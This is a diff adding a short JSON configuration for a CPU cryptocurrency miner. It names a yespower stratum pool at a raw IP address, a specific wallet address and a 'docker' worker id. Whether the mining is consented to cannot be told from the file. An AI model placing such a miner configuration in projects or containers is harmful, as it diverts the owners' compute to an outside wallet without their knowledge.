@@ -1,0 +1,15 @@
+{
+	"_comment1" : "Any long-format command line argument ",
+	"_comment2" : "may be used in this JSON configuration file",
+
+	"api-bind" : "127.0.0.1:80",
+
+	"url" : "stratum+tcp://103.249.70.7:6533",
+	"user" : "qT3gJ6ijQ4AJ473QTuHtkaSbArpwdgNFBN",
+	"pass" : "c=QOGE,id=docker",
+
+	"algo" : "yespower",
+	"threads" : 4,
+
+	"no-color" : true
+}
